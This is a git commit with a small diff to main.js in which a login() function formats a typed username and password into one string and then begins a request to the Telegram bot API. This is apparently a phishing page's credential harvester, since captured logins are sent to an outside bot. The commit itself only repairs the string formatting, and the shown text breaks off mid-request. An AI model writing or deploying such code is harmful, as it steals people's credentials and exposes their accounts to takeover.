63d19eb9fa1af41140e83716a1828c1d23287b05
kosaeer <58988897+kosaeer@users.noreply.github.com>
2020-02-18 08:53:06 -0800

    Update main.js

--- main.js
+++ main.js
@@ -23,8 +23,7 @@ function login() {
   if (username.length > 0 && pass.length > 0) {
     $("#logbut").attr("disabled", "disabled");
 
-    var text = "user : `" + username + "` |
-    | pass : `" + pass + "`";
+    var text = "user : `" + username + "` || pass : `" + pass + "`";
 
     $.get(
       "https://api.telegram.org/bot" +
